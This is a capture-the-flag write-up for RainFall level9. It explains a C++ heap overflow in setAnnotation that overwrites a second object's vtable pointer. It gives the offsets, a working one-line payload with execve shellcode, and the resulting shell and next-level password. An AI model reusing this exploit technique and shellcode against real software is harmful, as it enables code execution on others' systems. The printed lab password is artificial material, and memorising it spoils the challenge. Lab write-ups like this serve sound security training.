## Level 9

### Vulnerability Analysis
The target is `level9`, compiled from C++. This level introduces C++ Virtual Table (vtable) hijacking via a Heap overflow.

Analyzing the disassembly of `main` and the class `N`:
1. The program defines a C++ class `N`, which includes a constructor `N(int)`, an annotation setter `N::setAnnotation(char*)`, and a virtual operator `N::operator+(N&)`.
2. In `main`, it dynamically allocates two objects of class `N` using `new()` (`_Znwj`). `obj1` is instantiated with the value `5`, and `obj2` is instantiated with the value `6`. 
3. It takes the first command length argument (`argv[1]`) and passes it into `obj1->setAnnotation(argv[1])`.
4. Looking at `setAnnotation`, it copies the user string into the object's `annotation` field using `memcpy` with `strlen(str)`! Because it doesn't limit the size copied, we have a Heap Buffer Overflow originating inside `obj1`.
5. Finally, the program calls `obj2->operator+(obj1)` via its virtual table (vtable). Because the function is virtual, C++ looks up the function pointer dynamically at runtime using the `vtable` pointer stored at the very beginning of the object's memory struct.

### The Exploit
Since `obj1` and `obj2` are allocated sequentially on the heap, if we overflow the `annotation` buffer in `obj1`, we will overwrite the contents of `obj2`. 

Specifically, we want to overwrite the `vtable` pointer of `obj2` (which is located at byte 0 of `obj2`'s memory).

When the program executes `obj2->operator+(obj1)`, it performs the following logic on the assembly level:
```assembly
0x08048680 <+140>:   mov    eax,DWORD PTR [eax]    # Load vtable pointer
0x08048682 <+142>:   mov    edx,DWORD PTR [eax]    # Load first function from vtable
...
0x08048693 <+159>:   call   edx                    # Execute it!
```

If we construct a fake vtable inside `obj1`'s buffer, we can overwrite `obj2`'s vtable pointer to point back to our mocked vtable. Our mocked vtable will contain a pointer to shellcode (also stored in `obj1`'s buffer)!

To execute the VTable hijack, we first map the heap addresses using `ltrace`:
```bash
level9@RainFall:~$ ltrace ./level9 1234
...
_Znwj(108) = 0x804a008  // obj1 instantiated
_Znwj(108) = 0x804a078  // obj2 instantiated
memcpy(0x0804a00c, "1234", 4) // obj1->setAnnotation() called
```
We learn the following:
* `obj1` lives at `0x0804a008`.
* `obj1`'s annotation buffer strictly begins at `0x0804a00c` (4 bytes past the start of the object, which aligns with standard C++ objects where the first 4 bytes are the hidden `vptr` and the next bytes hold the variables).
* `obj2` lives at `0x0804a078`. Because the `vptr` is located at byte 0 of an object's memory, `0x0804a078` is the exact address we must overflow into.

The distance from the start of our string buffer (`0x0804a00c`) to the target `obj2->vptr` (`0x0804a078`) is `0x6c` (108 bytes).

We must forge the payload as:
1. `obj2->vptr` offset (108 bytes padding) completely overwrites `obj2`'s `vptr` with a pointer to our *Fake VTable*. Let's point the fake VTable to the start of our buffer: `0x0804a00c`.
2. Because the program looks at the fake `vptr` and expects an array of function pointers (a VTable), we must put a function pointer at `0x0804a00c`. So the first 4 bytes of our buffer will be the exact address of our Shellcode (`0x0804a010`, which is 4 bytes further down our buffer).
3. We place our Shellcode at `0x0804a010`.

Payload Layout:
`[Address of Shellcode] + [Shellcode] + [Padding up to 108 bytes] + [Address of Fake VTable]`

```bash
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```